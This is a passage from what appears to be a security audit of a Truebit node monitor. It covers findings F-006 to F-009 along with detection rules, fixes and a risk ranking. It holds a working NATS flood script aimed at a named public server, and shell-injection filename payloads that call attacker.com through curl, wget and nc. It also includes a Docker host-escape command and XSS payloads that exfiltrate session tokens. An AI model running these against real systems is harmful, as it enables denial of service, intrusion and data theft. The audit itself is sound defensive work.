| Factor | Assessment |
|--------|-----------|
| **Access Required** | NATS server access (wss://f.tru.watch) |
| **Authentication** | Public NATS server allows connections |
| **Cost** | Free - Public endpoint available |
| **Technical Skill** | Medium - Requires NATS protocol knowledge |
| **Amplification Factor** | High - One message = Multiple DB operations |
| **Detection Difficulty** | Medium - Mixed with legitimate anonymous traffic |
| **Mitigation Bypass** | Easy - Simply omit nodeId field |

**Exploitation Tools:**
```javascript
// Simple NATS flood script
import { connect } from 'nats.ws';

async function flood() {
  const nc = await connect({
    servers: ['wss://f.tru.watch']
  });

  console.log('Connected to NATS');

  // Attack 1: No nodeId (bypass rate limit)
  for (let i = 0; i < 10000; i++) {
    nc.publish('truebit.task.received', JSON.stringify({
      // nodeId intentionally omitted
      data: {
        taskType: 'wasm',
        taskHash: `fake-${i}`,
        elapsed_ms: Math.random() * 10000
      },
      timestamp: new Date().toISOString()
    }));

    if (i % 100 === 0) {
      console.log(`Sent ${i} messages bypassing rate limit`);
    }
  }

  // Attack 2: Rotating nodeIds (fill map)
  for (let i = 0; i < 100000; i++) {
    nc.publish('truebit.task.received', JSON.stringify({
      nodeId: `attacker-${i}`,  // Unique each time
      data: { fake: 'data' },
      timestamp: new Date().toISOString()
    }));
  }

  console.log('Flood complete');
}

flood();
```

#### Impact Assessment

**Rating: MEDIUM**

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Availability** | HIGH | Aggregator service degradation or crash |
| **Data Integrity** | MEDIUM | Statistics corrupted with fake data |
| **Resource Exhaustion** | HIGH | Memory, disk, CPU consumed |
| **Service Quality** | MEDIUM | Legitimate nodes experience delays |
| **Financial** | LOW | Minimal cost (public NATS) but affects network trust |

**Attack Impact Breakdown:**

| Attack Vector | Resource Targeted | Impact |
|--------------|-------------------|---------|
| **Anonymous Flood** | Database I/O | INSERT operations saturate disk I/O |
| **Map Overflow** | Memory | nodeMessageCounts grows unbounded |
| **Large Payloads** | Network Bandwidth | Saturates NATS bandwidth |
| **Statistics Pollution** | Data Integrity | Network stats become unreliable |
| **Cleanup Delay** | Disk Space | 24-hour retention allows amplification |

**Performance Degradation:**
```javascript
// Normal operation
{
  "messages_per_second": 10,
  "database_inserts_per_second": 10,
  "memory_usage_mb": 50,
  "response_time_ms": 50
}

// During attack (no nodeId flood)
{
  "messages_per_second": 10000,  // 1000× increase
  "database_inserts_per_second": 10000,
  "memory_usage_mb": 500,  // 10× increase
  "response_time_ms": 5000,  // 100× degradation
  "disk_io_saturation": "95%",
  "legitimate_message_delay_ms": 30000  // 30 second delays
}
```

#### Attack Prerequisites

1. **NATS Server Access:**
   - Public server: wss://f.tru.watch
   - No authentication required for connection
   - WebSocket accessible from browser or script

2. **NATS Protocol Knowledge:**
   - Basic understanding of pub/sub
   - Know subject names: `truebit.task.received`, etc.
   - JSON message format

3. **Tools:**
   - NATS client library (nats.ws, nats.deno, nats-cli)
   - Or raw WebSocket library
   - Cost: $0 (open source tools, public server)

4. **No Prerequisites for:**
   - Authentication tokens
   - Valid nodeId (attack specifically omits this)
   - Cryptographic keys
   - Infrastructure (can run from laptop)

#### Detection Mechanisms

**Current State:** Minimal - Only rate limit counter, no anomaly detection

**Recommended Detection Signatures:**

```yaml
Detection Rule 1: Messages Without nodeId
  Trigger: Message received with null/undefined nodeId
  Alert: MEDIUM severity
  Response: Reject message, log source IP
  Pattern: "nodeId": null or missing field

Detection Rule 2: Abnormal Message Rate
  Trigger: Global message rate > 100/second
  Alert: HIGH severity
  Baseline: Normal is ~10-50/second
  Response: Enable global rate limiting

Detection Rule 3: Map Size Anomaly
  Trigger: nodeMessageCounts.size > 1000 entries
  Alert: HIGH severity
  Normal: ~10-100 active nodes
  Response: Aggressive cleanup, identify fake nodeIds

Detection Rule 4: Database Growth Rate
  Trigger: Database size increases > 100MB/hour
  Alert: MEDIUM severity
  Response: Enable message size limits

Detection Rule 5: Repeated Unique nodeIds
  Trigger: > 100 new nodeIds in 1 minute
  Alert: HIGH severity
  Pattern: Rotating nodeId attack
  Response: Require nodeId authentication

Detection Rule 6: Memory Growth Rate
  Trigger: Process memory increases > 50MB/minute
  Alert: HIGH severity
  Pattern: Map overflow attack
  Response: Emergency cleanup, restart
```

**Enhanced Monitoring:**
```javascript
{
  "timestamp": "2025-12-19T10:30:00Z",
  "event": "RATE_LIMIT_BYPASS_DETECTED",
  "severity": "HIGH",
  "details": {
    "messages_without_nodeid": 50000,
    "time_window": "5 minutes",
    "total_messages": 50123,
    "bypass_percentage": 99.75,
    "source_ips": ["203.0.113.45", "198.51.100.67"],
    "subjects": ["truebit.task.received", "truebit.task.completed"],
    "database_size_mb": 850,
    "database_growth_mb_per_hour": 200,
    "map_size": 45000,
    "memory_usage_mb": 450
  },
  "recommended_action": "Enable global rate limiting and nodeId validation"
}
```

**Real-Time Metrics Dashboard:**
```javascript
{
  "aggregator_health": {
    "message_rate": {
      "current": 9500,
      "average": 25,
      "threshold": 100,
      "status": "CRITICAL"  // 95× over normal
    },
    "rate_limit_bypass": {
      "messages_without_nodeid_per_min": 570000,
      "percentage_bypassed": 99.9,
      "status": "CRITICAL"
    },
    "resource_usage": {
      "memory_mb": 480,
      "memory_limit_mb": 512,
      "disk_io_percent": 95,
      "status": "CRITICAL"
    },
    "data_integrity": {
      "suspicious_nodeids": 38000,
      "fake_statistics_estimated": "78%",
      "status": "DEGRADED"
    }
  }
}
```

#### Risk Matrix Position

**Exploitability × Impact = HIGH**

```
         Impact (Severity)
            LOW  MED  HIGH CRIT
E  EASY    [  ] [  ] [  ] [  ]
x  MED     [  ] [  ] [XX] [  ]  <- F-006
p  HARD    [  ] [  ] [  ] [  ]
l
```

---

### F-007: Container Exec Shell Injection (Low)

**Location:**
- `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/docker/logfile-reader.ts` (line 30-35, 57, 79, 100)
- `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/docker/eventdb-reader.ts` (line 124-131, 150, 162)

#### Attack Scenarios

**Scenario 1: Compromised Container Filename Attack**
```
Prerequisites:
- Attacker compromises Truebit node container
- Creates malicious log file with special characters

Attack Flow:
1. Inside compromised container, create file:
   touch '/app/logs/@truebit/worker-runner-node-1.0.0/; curl attacker.com/exfil | sh #.log'

2. Monitor's logfile-reader executes (line 57):
   execCommand(`ls -1 ${this.logBasePath}`)

3. Later, monitor tries to read log (line 100):
   execCommand(`tail -n 100 ${logDir}/${filename}`)

4. Command executed in container:
   sh -c "tail -n 100 /app/logs/.../; curl attacker.com/exfil | sh #.log"

5. Shell interprets semicolon as command separator
6. Executes: curl attacker.com/exfil | sh
7. Downloads and runs attacker's script inside container
8. Potential lateral movement to host via Docker socket

Payload Examples:
- `file.log; rm -rf /app/data #`
- `$(curl attacker.com/backdoor.sh) #.log`
- `file.log | nc attacker.com 1234 #`
```

**Scenario 2: EventDB Path Traversal + Injection**
```
Attack Flow:
1. Attacker compromises container
2. Creates malicious event database file:
   mkdir -p '/app/data/eventDB/; wget attacker.com/evil #'

3. Monitor's eventdb-reader lists files (line 150):
   execCommand(`ls -1 ${this.eventDBPath}`)

4. Filename returned: "; wget attacker.com/evil #"

5. Later execution (line 162):
   execCommand(`cat ${eventDBFile}`)
   Where: eventDBFile = `/app/data/eventDB/; wget attacker.com/evil #/events.jsonl`

6. Shell command executed:
   sh -c "cat /app/data/eventDB/; wget attacker.com/evil #/events.jsonl"

7. Semicolon breaks out of cat command
8. Executes: wget attacker.com/evil
9. Downloads malicious payload to container
```

**Scenario 3: Limited Escalation via Docker Socket**
```
Context:
- Container may have Docker socket mounted (-v /var/run/docker.sock)
- Command injection inside container can access Docker API

Attack Chain:
1. Inject command via malicious filename
2. Command runs inside container as container user
3. Access Docker socket: /var/run/docker.sock
4. Execute commands in other containers:
   docker exec other-container <malicious-command>
5. Or create privileged container:
   docker run --privileged --pid=host --network=host -v /:/host alpine chroot /host
6. Escape to host system

Limitation:
- Requires Docker socket mounted in container
- Container user must have Docker socket access
- Not default configuration for Truebit node
```

#### Exploitability Assessment

**Rating: HARD**

| Factor | Assessment |
|--------|-----------|
| **Initial Access** | Requires container compromise FIRST |
| **Attack Chain** | Multi-step: 1) Compromise container, 2) Create malicious file, 3) Wait for monitor read |
| **Technical Skill** | High - Container compromise + shell injection knowledge |
| **Scope** | Limited to container environment (no direct host access) |
| **Prerequisites** | Significant - Container must already be compromised |
| **Impact** | Medium - Lateral movement within container/Docker environment |

**Exploitation Difficulty Analysis:**

```
Step 1: Compromise Truebit Node Container
  Difficulty: VERY HARD
  Prerequisites:
    - Vulnerability in Truebit node software
    - Or weak container configuration
    - Or supply chain attack
    - Or host system compromise first

  This is the hardest step and makes entire attack chain impractical

Step 2: Create Malicious Filename
  Difficulty: EASY (once inside container)
  Command: touch '/app/logs/worker/; evil command #.log'

Step 3: Trigger Monitor to Read File
  Difficulty: AUTOMATIC
  Monitor polls logs every few seconds
  No user interaction needed

Step 4: Execute Injected Command
  Difficulty: AUTOMATIC
  Shell injection triggers on file read
```

**Why This Is Rated LOW Despite Being Shell Injection:**

1. **Requires Prior Compromise:** Attacker must already own the container
2. **Limited Blast Radius:** Execution contained within container
3. **No Direct Host Access:** Container isolation still effective
4. **Secondary Exploit:** If container is compromised, this is redundant
5. **Defensive Depth:** Defense-in-depth issue, not primary vulnerability

#### Impact Assessment

**Rating: LOW (given prerequisite of container compromise)**

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Confidentiality** | LOW | Limited to data within container environment |
| **Integrity** | MEDIUM | Can modify container files, potentially poison logs |
| **Availability** | MEDIUM | Can crash monitor process, delete files |
| **Lateral Movement** | MEDIUM | Potential Docker escape if socket mounted |
| **Host Compromise** | LOW | Container isolation limits impact |

**Impact Scenarios:**

| If Attacker... | Then They Can... | Impact |
|----------------|------------------|---------|
| **Creates malicious log filename** | Execute commands during log reading | Redundant with container compromise |
| **Injects into tail command** | Read arbitrary files in container | Limited to container filesystem |
| **Uses `rm -rf`** | Delete monitor data, corrupt logs | Availability impact |
| **Uses network commands** | Exfiltrate container data | Container data likely already accessible |
| **Accesses Docker socket** | Escape to host system | **CRITICAL** but requires socket mount |

**Realistic Impact Assessment:**

```
Scenario: Attacker has already compromised container

  WITHOUT F-007 (shell injection):
    - Full control of container filesystem
    - Can modify Truebit node behavior
    - Can read all container data
    - Can crash container
    - Lateral movement requires additional exploit

  WITH F-007 (shell injection):
    - Same as above (already have container access)
    - Plus: Can execute commands as monitor's exec user
    - Plus: Can potentially access Docker socket
    - Marginal additional capability

  Conclusion: F-007 provides minimal additional value to attacker
```

#### Attack Prerequisites

**Critical Prerequisite (Makes Attack Impractical):**

1. **Container Must Be Compromised First:**
   - Requires vulnerability in Truebit node software
   - Or weak container security configuration
   - Or supply chain attack on node container image
   - Or host system already compromised

   **This is extremely difficult and makes F-007 a secondary concern**

**Additional Prerequisites:**

2. **File Creation Capability:**
   - Attacker can create files with arbitrary names
   - Write access to `/app/logs/` or `/app/data/eventDB/`
   - Already implied by container compromise

3. **Monitoring Active:**
   - Monitor must be running and polling logs
   - Automatic in normal operation

4. **Docker Socket (For Host Escape):**
   - `/var/run/docker.sock` mounted in container
   - Not default configuration
   - Typically only in development setups

#### Detection Mechanisms

**Current State:** No filename validation or shell injection detection

**Recommended Detection Signatures:**

```yaml
Detection Rule 1: Suspicious Filenames in Container
  Trigger: Log/event files with shell metacharacters
  Pattern: [;|&$`<>(){}] in filename
  Alert: HIGH severity
  Response: Quarantine file, alert security team

Detection Rule 2: Command Injection Attempts
  Trigger: Exec commands with unusual patterns
  Pattern: Multiple commands (;), command substitution ($(), ``)
  Alert: CRITICAL severity
  Response: Block execution, incident response

Detection Rule 3: Unusual Files in Log Directories
  Trigger: Files not matching expected naming pattern
  Expected: worker-runner-node-*.log, events-*.jsonl
  Alert: MEDIUM severity

Detection Rule 4: Rapid File Creation
  Trigger: > 10 new log files created per minute
  Alert: MEDIUM severity
  Pattern: Potential attack preparation

Detection Rule 5: Container Integrity Violation
  Trigger: File creation in monitored directories from unexpected process
  Alert: HIGH severity
  Response: Container compromise suspected
```

**Filename Validation (Prevention):**
```javascript
// Recommended secure implementation
function validateLogFilename(filename) {
  // Allow only alphanumeric, dash, underscore, dot
  const safePattern = /^[a-zA-Z0-9._-]+$/;

  if (!safePattern.test(filename)) {
    logAuditEvent('SUSPICIOUS_FILENAME', {
      filename,
      severity: 'HIGH',
      message: 'Potential shell injection attempt'
    });

    throw new Error(`Unsafe filename rejected: ${filename}`);
  }

  // Additional checks
  if (filename.includes('..')) {
    throw new Error('Path traversal detected');
  }

  if (filename.length > 255) {
    throw new Error('Filename too long');
  }

  return filename;
}

// Use in exec command
const safeFilename = validateLogFilename(filename);
execCommand(['tail', '-n', '100', `${logDir}/${safeFilename}`]);  // Array, not shell
```

**Enhanced Logging:**
```javascript
{
  "timestamp": "2025-12-19T10:30:00Z",
  "event": "SHELL_INJECTION_DETECTED",
  "severity": "CRITICAL",
  "details": {
    "filename": "; curl attacker.com/evil | sh #.log",
    "directory": "/app/logs/@truebit/worker-runner-node-1.0.0/",
    "command_attempted": "tail -n 100 /app/logs/.../; curl attacker.com/evil | sh #.log",
    "metacharacters_detected": [";", "|"],
    "action": "blocked",
    "container_id": "abc123",
    "potential_compromise": true
  },
  "recommended_action": "INCIDENT RESPONSE: Container compromise suspected"
}
```

#### Risk Matrix Position

**Exploitability × Impact = LOW** (due to extreme prerequisite difficulty)

```
         Impact (Severity)
            LOW  MED  HIGH CRIT
E  EASY    [  ] [  ] [  ] [  ]
x  MED     [  ] [  ] [  ] [  ]
p  HARD    [XX] [  ] [  ] [  ]  <- F-007
l
           (Hard to exploit + Low incremental impact)
```

**Note:** While shell injection is typically high severity, this specific instance is rated LOW because:
1. Requires prior container compromise (very difficult)
2. Provides minimal additional capability beyond existing container access
3. Container isolation limits blast radius
4. Defense-in-depth issue rather than primary vulnerability

---

### F-008: Dead Registration Code (Low)

**Location:**
- `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/parsers/log-parser.ts` (line 100, 195, 251)
- `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/index.ts` (line 434, 621-638)

#### Attack Scenarios

**Scenario 1: False Security Assumptions**
```
Developer Assumptions:
1. Code exists to handle node registration events
2. Database has 'registered' field (line 52: registered?: boolean)
3. handleRegistration function processes registration (line 621-638)
4. Developers assume registration tracking works

Reality:
1. Parser never extracts nodeAddress (line 100 commented out)
2. handleRegistration never receives nodeAddress
3. Registration events never recorded in database
4. Database field 'registered' always remains NULL/false

Attack Vector:
- Operators rely on registration status for trust decisions
- "Is this node properly registered on-chain?"
- Database says: registered = false (always)
- Real answer: Unknown (not being tracked)
- Operators make decisions based on incomplete data
```

**Scenario 2: Incomplete Audit Trail**
```
Compliance Scenario:
1. Auditor asks: "Show me when the node was registered"
2. Developer checks database: registered = 0 for all records
3. Developer checks logs: No registration events recorded
4. Conclusion: Node never registered? (FALSE)
5. Actual: Code doesn't track it, but node IS registered

Impact:
- Compliance failures
- False alarms about node status
- Trust in monitoring system degraded
```

**Scenario 3: Unused Code Exploitation**
```
Attack Path:
1. Attacker reviews code, finds handleRegistration
2. Assumes it's actively used for access control
3. Sends fake registration log entries to test
4. Discovers registration tracking doesn't work
5. Realizes node status tracking is incomplete
6. Exploits gap in monitoring/alerting
```

#### Exploitability Assessment

**Rating: N/A (Code Quality Issue, Not Exploitable Vulnerability)**

| Factor | Assessment |
|--------|-----------|
| **Direct Exploitation** | None - Dead code has no execution path |
| **Security Impact** | Minimal - No authentication/authorization relies on this |
| **Functionality Impact** | Low - Registration tracking non-functional |
| **Maintenance Risk** | Medium - Confuses developers, false assumptions |
| **Technical Debt** | Medium - ~50 lines of unused code |

**Why This Is Not Exploitable:**

1. **No Execution Path:** Parser never sets `nodeAddress` field
2. **No Dependencies:** No security controls rely on registration status
3. **Dead Code:** handleRegistration never receives data to process
4. **Isolated Impact:** Doesn't affect other system components

**Code Flow Analysis:**
```javascript
// Expected Flow (BROKEN)
[Log Line] → Parser → Extract nodeAddress → handleRegistration → Database Update

// Actual Flow
[Log Line] → Parser → (nodeAddress extraction commented out) → ❌ STOPS

// handleRegistration waits for data that never arrives
function handleRegistration(parsed) {
  if (!parsed.nodeAddress) {  // ALWAYS TRUE (never set)
    console.error('No node address in registration');  // Always logs this
    return;  // Always exits here
  }
  // This code is NEVER reached
  const hashedAddress = hashNodeAddress(parsed.nodeAddress);
  // ... rest of function never executes
}
```

#### Impact Assessment

**Rating: LOW (Code Quality, Not Security)**

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Security** | NONE | No security controls depend on registration status |
| **Functionality** | LOW | Registration tracking doesn't work, but not critical |
| **Maintainability** | MEDIUM | Confuses developers, creates false assumptions |
| **Technical Debt** | MEDIUM | ~50 lines of unused code, database field unused |
| **Operational** | LOW | Operators can't track registration, but not blocking |

**What Doesn't Work:**

```javascript
// Database field exists but never populated
CREATE TABLE node_status (
  registered BOOLEAN DEFAULT 0,  // NEVER set to 1
  // ... other fields
);

// Query returns false positives
db.prepare('SELECT * FROM node_status WHERE registered = 1').all();
// Returns: [] (empty) - Even if node IS registered on-chain

// Audit log shows false errors
console.error('No node address in registration');
// Logs constantly whenever registration event occurs
```

**What Still Works:**

- All other monitoring functionality (tasks, invoices, logs)
- Federation and statistics
- Authentication and security controls
- Docker monitoring
- Everything except registration tracking

#### Attack Prerequisites

**N/A - Not an exploitable vulnerability**

This is a code quality issue, not a security vulnerability. No attack prerequisites exist because there's no attack vector.

However, this creates **false security assumptions**:

1. **Developer Assumption:** "We track node registration"
2. **Reality:** Registration tracking is broken
3. **Risk:** Future features might rely on registration status
4. **Consequence:** Future security controls built on broken foundation

#### Detection Mechanisms

**Current State:** No detection needed (dead code)

**Recommended Code Quality Checks:**

```yaml
Static Analysis Rule 1: Dead Code Detection
  Trigger: Function defined but never called with valid data
  Pattern: handleRegistration always exits early
  Alert: Code Quality Warning
  Response: Remove or implement properly

Static Analysis Rule 2: Unused Database Fields
  Trigger: Database field never written, only read
  Pattern: 'registered' field always NULL/0
  Alert: Schema Cleanup Recommendation
  Response: Remove field or implement functionality

Static Analysis Rule 3: Commented-Out Logic
  Trigger: Critical logic commented out in parser
  Pattern: // parsed.nodeAddress = ... (line 100)
  Alert: Incomplete Implementation
  Response: Complete implementation or remove dependent code

Code Review Rule: Dead Code Branches
  Trigger: Code path never reached (if condition always true/false)
  Pattern: if (!parsed.nodeAddress) // Always true
  Alert: Dead Code Detected
  Response: Remove unreachable code
```

**Recommended Actions:**

```javascript
// Option 1: Implement Properly
// In log-parser.ts (line 100)
if (match) {
  parsed.nodeAddress = match[1];  // UNCOMMENT THIS
}

// Then handleRegistration will work as intended

// Option 2: Remove Dead Code
// Remove entire handleRegistration function
// Remove 'registered' field from database schema
// Remove registration parsing logic
// Document: "Registration tracking not implemented"

// Option 3: Document Limitation
/**
 * NOTE: Registration tracking is not currently implemented.
 * The 'registered' field in database is always false.
 * Use external blockchain explorer to verify registration status.
 */
```

#### Risk Matrix Position

**Impact = LOW (Code Quality, No Security Impact)**

```
         Impact (Severity)
            LOW  MED  HIGH CRIT
  Code     [XX] [  ] [  ] [  ]  <- F-008
  Quality
  Issue

  (Not a security vulnerability, just technical debt)
```

**Classification:**
- **Severity:** Low
- **Type:** Code Quality / Technical Debt
- **Priority:** Low (cleanup during refactoring)
- **Security Impact:** None (no controls depend on this)

---

### F-009: CSP Uses `unsafe-inline` and `unsafe-eval` (Low)

**Location:** `/Users/tk/projects/truebit-node-monitor/monitor/backend/src/index.ts` (lines 152-153)

#### Attack Scenarios

**Scenario 1: XSS Impact Amplification**
```
Context:
  CSP directive: scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"]

Normal CSP Protection:
  - Only scripts from same origin allowed
  - Inline scripts blocked
  - eval() blocked
  - XSS impact limited

Weakened CSP (Current):
  - Inline scripts allowed
  - eval() allowed
  - XSS impact significantly amplified

Attack Chain:
1. Attacker finds XSS vulnerability (not in current audit scope)
2. Injects malicious payload: <script>eval(atob('... encoded payload ...'))</script>
3. CSP does NOT block because 'unsafe-inline' + 'unsafe-eval' allowed
4. Payload executes with full privileges
5. Steals session tokens, CSRF tokens, exfiltrates data

Without unsafe-inline/eval:
  Same XSS attempt → CSP blocks execution → Attack mitigated
```

**Scenario 2: Stored XSS Persistence**
```
Attack Scenario:
1. Attacker injects XSS into task input data (if input validation weak)
2. Payload stored in database
3. Admin views task details page
4. XSS payload renders as inline script
5. CSP allows execution (unsafe-inline)
6. Attacker's script runs in admin's browser
7. Steals admin session, accesses audit logs, modifies federation settings

Example Payload in Task Input:
{
  "inputData": "<script>
    fetch('/api/audit-log', {
      headers: { 'X-Session-Token': sessionStorage.getItem('token') }
    })
    .then(r => r.json())
    .then(data => {
      eval('fetch(atob(\"aHR0cHM6Ly9hdHRhY2tlci5jb20vZXhmaWw=\"), {method: \"POST\", body: JSON.stringify(data)})');
    });
  </script>"
}

Result:
- Without unsafe-eval: eval() call blocked by CSP
- With unsafe-eval: eval() executes, exfiltrates audit logs
```

**Scenario 3: Third-Party Library Compromise**
```
Scenario:
1. Vue.js or dependency has security vulnerability (future)
2. Attacker exploits to inject code
3. Normally CSP would limit impact (no eval, no inline scripts)
4. With unsafe-eval, attacker can use eval() for dynamic code execution
5. Impact significantly worse than without CSP relaxation

Example:
- Compromised library: vue-router@4.x.x
- Exploit allows script injection
- Uses eval() to decode/execute payload
- CSP doesn't prevent because 'unsafe-eval' allowed
```

#### Exploitability Assessment

**Rating: N/A (Defense Weakening, Not Direct Exploit)**

| Factor | Assessment |
|--------|-----------|
| **Direct Exploitation** | None - CSP weakness doesn't create vulnerability itself |
| **Requires** | Primary XSS vulnerability (not found in audit) |
| **Impact Multiplier** | High - Makes XSS exploitation easier |
| **Attack Complexity** | Lower with relaxed CSP |
| **Bypass Difficulty** | N/A - Bypass already built into CSP |

**Defense-in-Depth Analysis:**

```
Layer 1: Input Validation
  Status: Implemented for most inputs
  Effectiveness: PRIMARY DEFENSE

Layer 2: Output Encoding
  Status: Vue.js templates auto-escape
  Effectiveness: STRONG

Layer 3: Content Security Policy
  Status: WEAKENED by unsafe-inline/eval
  Effectiveness: DEGRADED ← F-009

Layer 4: HTTPOnly Cookies
  Status: Not used (token in headers)
  Effectiveness: N/A

Conclusion:
  CSP is a backstop defense
  Weakening it increases risk if Layers 1-2 fail
  But Layers 1-2 appear solid (no XSS found in audit)
```

**Why This Is Rated LOW:**

1. **No Primary Vulnerability:** No XSS found in current codebase
2. **Vue.js Protection:** Templates auto-escape by default
3. **Limited Attack Surface:** Minimal user input rendering
4. **Framework Constraint:** Vue.js requires some CSP relaxation
5. **Compensating Controls:** Input validation, output encoding

#### Impact Assessment

**Rating: LOW (Defensive Weakening, Not Vulnerability)**

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **XSS Amplification** | MEDIUM | If XSS found, impact is worse |
| **Defense-in-Depth** | MEDIUM | One security layer weakened |
| **Direct Risk** | NONE | No vulnerability without XSS |
| **Future Risk** | LOW | Increases risk of future vulnerabilities |
| **Compliance** | LOW | Some security standards require strict CSP |

**Impact Comparison:**

| Scenario | With Strict CSP | With unsafe-inline/eval (Current) |
|----------|----------------|-----------------------------------|
| **XSS in task name** | CSP blocks inline script | Script executes |
| **Stored XSS in log** | CSP blocks, only text renders | Full XSS exploitation |
| **eval() in XSS payload** | Blocked by CSP | Executes successfully |
| **DOM-based XSS** | Limited by CSP | Full capability |
| **Third-party lib exploit** | eval() blocked | eval() allowed |

**Realistic Impact:**

```javascript
// Scenario: XSS vulnerability exists (hypothetical)

// Attacker payload
const xssPayload = `
<script>
  // Without unsafe-eval, this would be blocked
  const stolenData = sessionStorage.getItem('sessionToken');
  eval('fetch("https://attacker.com/exfil?data=" + btoa(stolenData))');
</script>
`;

// With strict CSP:
//   Browser blocks: "Refused to execute inline script (CSP)"
//   Impact: XSS mitigated by CSP

// With unsafe-inline + unsafe-eval (CURRENT):
//   Browser allows execution
//   eval() runs
//   Data exfiltrated
//   Impact: XSS fully exploited
```

#### Attack Prerequisites

**Primary Prerequisite (Currently Not Met):**

1. **XSS Vulnerability Must Exist:**
   - Not found in current audit
   - Vue.js provides strong XSS protection by default
   - Input validation appears adequate
   - **This makes F-009 largely theoretical risk**

**If XSS Were Found:**

2. **Attacker Can Inject Script:**
   - Via stored XSS (database)
   - Via reflected XSS (URL parameters)
   - Via DOM XSS (client-side)

3. **Script Uses inline/eval:**
   - Attacker needs `<script>` tags (inline)
   - Or needs `eval()`, `Function()`, `setTimeout(string)`

**Likelihood Assessment:**

```
P(F-009 Exploited) = P(XSS Found) × P(XSS Uses inline/eval) × P(User Visits)
                   = LOW × HIGH × MEDIUM
                   = LOW Overall Probability
```

#### Detection Mechanisms

**Current State:** CSP violations logged to browser console (not server-side)

**Recommended Monitoring:**

```yaml
Detection Rule 1: CSP Violation Reports
  Trigger: Browser sends CSP violation report
  Alert: MEDIUM severity
  Response: Investigate potential XSS attempt

  Implementation:
    Content-Security-Policy-Report-Only: ... report-uri /api/csp-violations

Detection Rule 2: Inline Script Execution Patterns
  Trigger: JavaScript execution with eval() in production
  Alert: LOW severity
  Pattern: Normal Vue.js operation includes some eval()
  Response: Baseline and alert on anomalies

Detection Rule 3: Script Source Anomalies
  Trigger: Scripts executing from unexpected sources
  Alert: HIGH severity
  Response: Potential XSS or code injection

Detection Rule 4: Production CSP Violations
  Trigger: CSP violation in production (if strict CSP enabled)
  Alert: HIGH severity
  Response: Potential attack or broken functionality
```

**CSP Reporting Implementation:**
```javascript
// Add CSP reporting endpoint
app.post('/api/csp-violations', express.json(), (req, res) => {
  const violation = req.body;

  logAuditEvent('CSP_VIOLATION', req, {
    blockedUri: violation['blocked-uri'],
    violatedDirective: violation['violated-directive'],
    documentUri: violation['document-uri'],
    sourceFile: violation['source-file'],
    lineNumber: violation['line-number'],
    severity: 'MEDIUM'
  });

  res.status(204).send();
});

// Update CSP to report violations
contentSecurityPolicy: {
  directives: {
    // ... existing directives ...
    reportUri: ['/api/csp-violations']
  }
}
```

**Browser Console Monitoring:**
```javascript
// CSP violation in browser console
[Report Only] Refused to execute inline script because it violates the following
Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline'
keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required.

// Indicates potential XSS attempt blocked by CSP
```

#### Risk Matrix Position

**Impact = LOW (Defensive Weakening, Requires Primary Vulnerability)**

```
         Impact (Severity)
            LOW  MED  HIGH CRIT
  Defense  [XX] [  ] [  ] [  ]  <- F-009
  Weakening

  (No direct vulnerability, weakens defenses against future XSS)
```

**Recommendations:**

```javascript
// Option 1: Strict CSP for Production
if (process.env.NODE_ENV === 'production') {
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],  // Remove unsafe-inline/eval
        // Use nonces for inline scripts if needed
        styleSrc: ["'self'"],  // Remove unsafe-inline
        // ... strict settings
      }
    }
  }));
} else {
  // Development: Allow unsafe-inline/eval for Vue devtools
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
        // ... relaxed settings
      }
    }
  }));
}

// Option 2: Use Nonces (Better)
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      // No unsafe-inline needed with nonces
    }
  }
}));

// Option 3: Hash-Based CSP (Most Secure)
// Calculate SHA-256 hash of each inline script
// Add to CSP: script-src 'self' 'sha256-...'
```

---

## Consolidated Risk Matrix

**Exploitability vs Impact Grid:**

```
                    IMPACT SEVERITY
                LOW        MEDIUM      HIGH        CRITICAL
              ┌──────────┬───────────┬───────────┬───────────┐
     EASY     │          │   F-003   │   F-001   │           │
  E           │          │           │   F-002   │           │
  X           ├──────────┼───────────┼───────────┼───────────┤
  P  MEDIUM   │          │   F-004   │   F-006   │           │
  L           │          │   F-005   │           │           │
  O           ├──────────┼───────────┼───────────┼───────────┤
  I  HARD     │   F-007  │           │           │           │
  T           │   F-008  │           │           │           │
  A           │   F-009  │           │           │           │
  B           └──────────┴───────────┴───────────┴───────────┘
  I
  L
  I
  T
  Y
```

---

## Prioritized Risk Ranking

### CRITICAL RISK (Address Immediately)

1. **F-001: Federation Endpoints Unauthenticated**
   - **Exploitability:** EASY
   - **Impact:** HIGH
   - **Risk Score:** 9.0/10
   - **Rationale:** Trivial to exploit, severe consequences, no authentication
   - **Action:** Implement authentication on all federation endpoints within 24 hours

2. **F-002: Origin Allowlist Bypass**
   - **Exploitability:** MEDIUM
   - **Impact:** HIGH
   - **Risk Score:** 7.5/10
   - **Rationale:** Moderate exploitation, high impact, affects CORS and WebSocket
   - **Action:** Fix origin validation logic immediately

### HIGH RISK (Address Soon)

3. **F-006: Aggregator Rate Limiting Bypass**
   - **Exploitability:** MEDIUM
   - **Impact:** MEDIUM-HIGH
   - **Risk Score:** 7.0/10
   - **Rationale:** Easy bypass, significant DoS and data integrity impact
   - **Action:** Implement global rate limiting and nodeId validation within 1 week

### MEDIUM RISK (Address in Sprint)

4. **F-003: WebSocket executionId Leak**
   - **Exploitability:** EASY
   - **Impact:** MEDIUM
   - **Risk Score:** 6.0/10
   - **Rationale:** Easy exploitation, privacy impact, violates stated guarantees
   - **Action:** Fix sanitization to remove executionId field

5. **F-005: CORS Allows All Origins**
   - **Exploitability:** MEDIUM
   - **Impact:** MEDIUM
   - **Risk Score:** 5.5/10
   - **Rationale:** Requires victim interaction, but default config vulnerable
   - **Action:** Change default to same-origin only

